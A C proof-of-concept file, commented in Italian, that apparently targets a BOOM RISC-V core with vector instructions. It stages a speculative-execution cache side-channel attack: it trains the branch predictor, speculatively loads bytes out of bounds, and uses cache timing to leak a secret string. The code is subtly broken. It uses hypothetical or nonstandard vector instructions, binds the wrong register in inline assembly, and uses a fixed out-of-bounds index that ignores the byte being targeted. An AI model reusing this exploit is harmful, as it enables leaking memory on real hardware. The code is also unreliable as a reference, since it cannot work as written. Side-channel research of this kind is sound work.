#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define NUM_ROUNDS 100
#define SECRET_LENGTH 26
#define CACHE_HIT_THRESHOLD 40
#define L1_BLOCK_SZ_BYTES 64

// Array usato come canale laterale di cache
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
// Dati segreti da estrarre
char* secretData = "!\"#ThisIsTheSecretString:)";
volatile uint8_t temp = 0;

// Setup RVV: In un contesto reale queste macro e intrinsics potrebbero differire.
// Ad esempio, vsetvli per impostare lunghezza del vettore.
// Qui ipotizziamo un contesto dove vsetvli e le load vettoriali siano disponibili.
static inline void setup_vv() {
    // Imposta i registri vettoriali per lavorare con un SEW=8 (byte) e LMUL=1
    // Il valore 256 è un esempio, si configura VLEN e SEW come da architettura
    __asm__ volatile ("vsetvli t0, zero, e8,m1");
}

// Carica un byte da secretData[x] in un registro vettoriale (simulazione).
// In caso di speculazione errata, potremmo caricare una locazione segreta.
static inline void victimFunctionVector(size_t x) {
    if (x < SECRET_LENGTH) {
        // Carichiamo speculativamente il byte secret in un registro vettoriale.
        // Simuliamo caricando un singolo elemento con indice x.
        // L'idea: se l'indice è fuori limite, la pipeline speculativa lo caricherà comunque.
        setup_vv();
        // Carichiamo secretData[x] in v0
        // Sintassi ipotetica: vlbuv.v v0, (secretData+x)
        // In pratica:
        __asm__ volatile (
            "addi t1, %0, 0\n\t"        // t1 = x
            "addi t2, %1, 0\n\t"        // t2 = base address secretData
            "add t2, t2, t1\n\t"        // t2 = &secretData[x]
            "vlb.v v0, (t2)\n\t"         // Carica un byte in v0
            :
            : "r"(x), "r"(secretData)
            : "t1", "t2", "v0"
        );

        // Ora utilizziamo il valore di v0 per indicizzare array2 e creare effetto in cache.
        // Estraiamo il byte da v0 in un registro GPR per usarlo come indice.
        // Nota: Non c’è un’istruzione standard per estrarre un elemento da un registro vettoriale
        // in modo diretto. In un contesto reale dovremmo fare store su stack e poi load, 
        // qui semplifichiamo fingendo di avere un’estensione o usando uno store temporaneo.
        uint8_t loaded_val;
        __asm__ volatile (
            "vsse8.v v0, (a0)"     // Store scalare del primo elemento di v0 in memoria a a0
            :
            : "r"(&loaded_val)
            : "memory", "v0"
        );

        // Accesso speculativo a array2 con offset derivato dal valore segreto
        // (loaded_val * L1_BLOCK_SZ_BYTES) per scaldare la cache.
        temp &= array2[loaded_val * L1_BLOCK_SZ_BYTES];
    }
}

int main(void) {
    static int results[256];
    uint8_t dummy = 0;

    // Inizializza array2 per evitare problemi di allineamento e aggiustare pattern
    for (int i = 0; i < 256; i++) {
        array2[i * L1_BLOCK_SZ_BYTES] = 1;
    }

    printf("Inizio dell'attacco tipo Downfall PoC su BOOM RISC-V con RVV...\n");

    for (int target_offset = 0; target_offset < SECRET_LENGTH; target_offset++) {
        for (int j = 0; j < 256; j++) {
            results[j] = 0;
        }

        for (int round = 0; round < NUM_ROUNDS; round++) {
            // Flush dell'array2 prima di ogni tentativo
            flushCache((uint64_t)array2, sizeof(array2));

            // Allenamento branch predictor: chiamate multiple con indici validi
            for (int train = 0; train < 30; train++) {
                size_t training_index = train % SECRET_LENGTH;
                victimFunctionVector(training_index);
            }

            // Ora chiamiamo con un indice fuori dai limiti per provocare speculazione
            size_t malicious_index = SECRET_LENGTH + 5;
            victimFunctionVector(malicious_index);

            // Misuriamo il tempo di accesso per ogni linea di array2
            for (int k = 0; k < 256; k++) {
                uint64_t start = rdcycle();
                dummy &= array2[k * L1_BLOCK_SZ_BYTES];
                uint64_t elapsed = rdcycle() - start;

                if (elapsed < CACHE_HIT_THRESHOLD) {
                    results[k]++;
                }
            }
        }

        // Trova il valore con il maggior numero di cache hits
        int max = -1;
        int max_idx = -1;
        for (int j = 0; j < 256; j++) {
            if (results[j] > max) {
                max = results[j];
                max_idx = j;
            }
        }

        char guessed_char = (char)max_idx;
        if (max <= 0) {
            guessed_char = '?'; // Se non abbiamo hits, mettiamo un placeholder
        }

        printf("Byte %d: expected '%c', guessed '%c' (hits: %d)\n",
               target_offset, secretData[target_offset], guessed_char, max);
    }

    return 0;
}

